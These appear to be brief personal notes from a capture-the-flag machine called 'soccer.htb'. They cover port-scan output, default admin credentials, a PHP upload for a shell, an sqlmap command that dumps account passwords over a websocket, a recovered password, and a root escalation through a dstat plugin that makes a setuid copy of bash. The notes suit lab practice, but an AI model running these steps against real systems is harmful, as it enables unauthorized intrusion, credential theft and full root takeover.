PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?

![[Pasted image 20221218080504.png]]
default admin:admin@123
tried exploit for this version but didn't work 
![[Pasted image 20221218080601.png]]
copy the .php file to uploads folder so we can modify it
![[Pasted image 20221218080629.png]]
file gets deleted by some kind of cron so we need to be fast
![[Pasted image 20221218080723.png]]
save ![[Pasted image 20221218080738.png]]
![[Pasted image 20221218080811.png]]
and we get a shell
![[Pasted image 20221218080834.png]]
![[Pasted image 20221218080904.png]]
![[Pasted image 20221218080943.png]]
 sqlmap -u ws://soc-player.soccer.htb:9091 --data="{\"id\":\"67114\"}" -D "soccer_db" -T "accounts" -C "password" --dump --batch 

player:PlayerOftheMatch2022

/data                                                                                                                                  
/vagrant   
```
5133      sed-Es,jdwp|tmux |screen | inspect |--inspect[= ]|--inspect$|--inpect-brk|--remote-debugging-port,&,g       
```
create plugin inside dstat folder
name it dstat_smth.py
inside the script
import os
os.system("(cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && chmod +x /tmp/bash")

doas -u root dstat --list
doas -u root dstat --smth
